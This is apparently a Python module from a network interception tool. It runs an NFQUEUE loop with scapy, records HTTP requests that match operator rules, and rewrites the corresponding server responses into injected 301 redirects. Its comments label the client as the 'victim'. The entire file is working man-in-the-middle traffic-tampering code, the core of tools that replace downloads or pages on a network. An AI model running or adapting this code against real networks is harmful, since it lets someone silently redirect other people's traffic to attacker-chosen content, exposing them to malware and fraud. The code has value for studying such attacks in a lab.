"""NFQUEUE-based packet interceptor — the core engine.

This module runs a ``netfilterqueue.NetfilterQueue`` loop.  For every IP
packet that enters the queue it:

1. Extracts the TCP payload.
2. If the payload is an **HTTP request** matching a rule, stores the
   request key (src/dst IP:port) so we can identify the response later.
3. If the payload is an **HTTP response** whose corresponding request was
   flagged, replaces the entire TCP payload with a 301 redirect to the
   operator-configured replacement URL.

All heavy lifting (parsing, rule matching, packet rewriting) is delegated to
the sibling modules; this module is the *event loop glue*.
"""

from __future__ import annotations

import logging
import signal
import struct
from dataclasses import dataclass, field
from typing import Callable

from . import http_rewrite, rules

LOGGER = logging.getLogger(__name__)

# We import these at module level so the test suite can monkeypatch them.
try:
    import scapy.all as scapy  # noqa: WPS433
except ImportError:
    scapy = None  # type: ignore[assignment]

try:
    import netfilterqueue  # noqa: WPS433
except ImportError:
    netfilterqueue = None  # type: ignore[assignment]


# ---------------------------------------------------------------------------
# ACK/SEQ correlation bookkeeping
# ---------------------------------------------------------------------------

@dataclass
class ConnectionTracker:
    """Tracks in-flight HTTP requests so we can identify matching responses.

    The data structure maps a *request correlation key* — a 4-tuple of
    ``(src_ip, src_port, dst_ip, dst_port)`` — to the ``ReplacementInfo``
    describing what redirect to inject.

    Entries are expired after ``max_entries`` to prevent memory growth on
    long-lived keep-alive connections.
    """

    _pending: dict[tuple, ReplacementInfo] = field(default_factory=dict)
    max_entries: int = 4096

    def track(self, key: tuple, info: ReplacementInfo) -> None:
        """Record that we expect a response for this request."""
        if len(self._pending) >= self.max_entries:
            # Evict oldest entry (dicts are insertion-ordered in 3.7+).
            oldest = next(iter(self._pending))
            del self._pending[oldest]
        self._pending[key] = info

    def pop(self, key: tuple) -> ReplacementInfo | None:
        """Return and remove the pending replacement for *key*, or ``None``."""
        return self._pending.pop(key, None)

    def __len__(self) -> int:
        return len(self._pending)

    def clear(self) -> None:
        self._pending.clear()


@dataclass(frozen=True)
class ReplacementInfo:
    """Describes how to rewrite a matched response."""

    redirect_url: str
    rule_name: str
    original_path: str


# ---------------------------------------------------------------------------
# Core packet handler
# ---------------------------------------------------------------------------

class PacketHandler:
    """Stateful callback that processes each NFQUEUE packet."""

    def __init__(
        self,
        ruleset: rules.Ruleset,
        dry_run: bool = False,
        json_logger: Callable[[dict], None] | None = None,
    ) -> None:
        self.ruleset = ruleset
        self.dry_run = dry_run
        self.json_logger = json_logger
        self.tracker = ConnectionTracker()
        self.stats = Stats()

    # ------------------------------------------------------------------
    def __call__(self, packet) -> None:
        """NFQUEUE callback — called for every queued IP packet."""
        try:
            self._process(packet)
        except Exception:
            LOGGER.exception("Unhandled exception processing packet")
            packet.accept()

    # ------------------------------------------------------------------
    def _process(self, packet) -> None:
        ip = scapy.IP(packet.get_payload())

        # We only care about TCP.
        if not ip.haslayer(scapy.TCP):
            packet.accept()
            return

        tcp = ip[scapy.TCP]
        payload = bytes(tcp.payload) if tcp.payload else b""

        if not payload:
            packet.accept()
            return

        src_ip = ip.src
        dst_ip = ip.dst
        src_port = tcp.sport
        dst_port = tcp.dport

        # --- Outgoing HTTP request (victim -> server, typically dport 80) ---
        if http_rewrite.is_http_request(payload):
            self._handle_request(payload, src_ip, src_port, dst_ip, dst_port)
            packet.accept()
            return

        # --- Incoming HTTP response (server -> victim, typically sport 80) ---
        if http_rewrite.is_http_response(payload):
            self._handle_response(packet, ip, tcp, payload,
                                  src_ip, src_port, dst_ip, dst_port)
            return

        # Not HTTP — let it through.
        packet.accept()

    # ------------------------------------------------------------------
    def _handle_request(
        self,
        payload: bytes,
        src_ip: str,
        src_port: int,
        dst_ip: str,
        dst_port: int,
    ) -> None:
        """Check an outgoing HTTP request against the ruleset."""
        info = http_rewrite.parse_request_headers(payload)
        if info is None:
            return

        host = info.host
        path = info.path

        # Some CDNs set a different Host; also check Content-Type of the
        # request (rare but some APIs set it).
        ct = info.headers.get("Content-Type") or info.headers.get("content-type")

        replacement = self.ruleset.match(path, host=host, content_type=ct)
        if replacement is None:
            return

        key = http_rewrite.correlation_key(src_ip, src_port, dst_ip, dst_port)
        rule_name = "default"
        for r in self.ruleset.rules:
            if r.replacement_url == replacement:
                rule_name = r.name
                break

        self.tracker.track(key, ReplacementInfo(
            redirect_url=replacement,
            rule_name=rule_name,
            original_path=path,
        ))

        self.stats.requests_matched += 1
        LOGGER.info(
            "[MATCH] %s %s %s -> %s",
            "GET", host, path, replacement,
        )

    # ------------------------------------------------------------------
    def _handle_response(
        self,
        packet,
        ip,
        tcp,
        payload: bytes,
        src_ip: str,
        src_port: int,
        dst_ip: str,
        dst_port: int,
    ) -> None:
        """Check an incoming HTTP response against the pending match map."""
        key = http_rewrite.correlation_key(dst_ip, dst_port, src_ip, src_port)
        pending = self.tracker.pop(key)

        if pending is None:
            packet.accept()
            return

        # Build the redirect
        resp_info = http_rewrite.parse_response_headers(payload)
        http_ver = resp_info.version if resp_info else "HTTP/1.1"
        host = resp_info.headers.get("Host", "") if resp_info else ""

        redirect_bytes = http_rewrite.build_301_redirect(
            redirect_url=pending.redirect_url,
            original_host=host,
            http_version=http_ver,
        )

        self.stats.responses_replaced += 1
        LOGGER.info(
            "[REPLACE] %s -> 301 -> %s",
            pending.original_path, pending.redirect_url,
        )

        # Log the interception in structured JSON
        if self.json_logger is not None:
            self.json_logger({
                "event": "intercept",
                "original_path": pending.original_path,
                "redirect_url": pending.redirect_url,
                "rule": pending.rule_name,
                "src_ip": ip.dst,
                "dst_ip": ip.src,
            })

        if self.dry_run:
            LOGGER.info("[DRY-RUN] Would replace %d bytes with %d-byte redirect",
                        len(payload), len(redirect_bytes))
            packet.accept()
            return

        # Replace the TCP payload and fix checksums.
        tcp.payload = scapy.Raw(load=redirect_bytes)
        del ip.len
        del ip.chksum
        del tcp.chksum
        packet.set_payload(bytes(ip))


# ---------------------------------------------------------------------------
# Statistics
# ---------------------------------------------------------------------------

@dataclass
class Stats:
    """Simple counters for the session."""

    requests_matched: int = 0
    responses_replaced: int = 0
    packets_seen: int = 0


# ---------------------------------------------------------------------------
# NFQUEUE runner
# ---------------------------------------------------------------------------

def run_queue(
    queue_num: int,
    handler: PacketHandler,
) -> None:
    """Bind to NFQUEUE *queue_num* and enter the blocking run loop.

    Installs ``SIGINT`` / ``SIGTERM`` handlers so the queue is unbound
    cleanly on exit.
    """
    if netfilterqueue is None:
        raise SystemExit(
            "netfilterqueue is required.  Install with:\n"
            "  pip install NetfilterQueue"
        )

    nfqueue = netfilterqueue.NetfilterQueue()
    nfqueue.bind(queue_num, handler)

    def _shutdown(signum: int, _frame) -> None:  # type: ignore[no-untyped-def]
        LOGGER.info("Signal %d received — stopping queue.", signum)
        nfqueue.unbind()
        nfqueue.exit()

    signal.signal(signal.SIGINT, _shutdown)
    signal.signal(signal.SIGTERM, _shutdown)

    LOGGER.info("NFQUEUE %d bound. Waiting for packets...", queue_num)
    try:
        nfqueue.run()
    finally:
        try:
            nfqueue.unbind()
        except Exception:  # noqa: BLE001
            pass
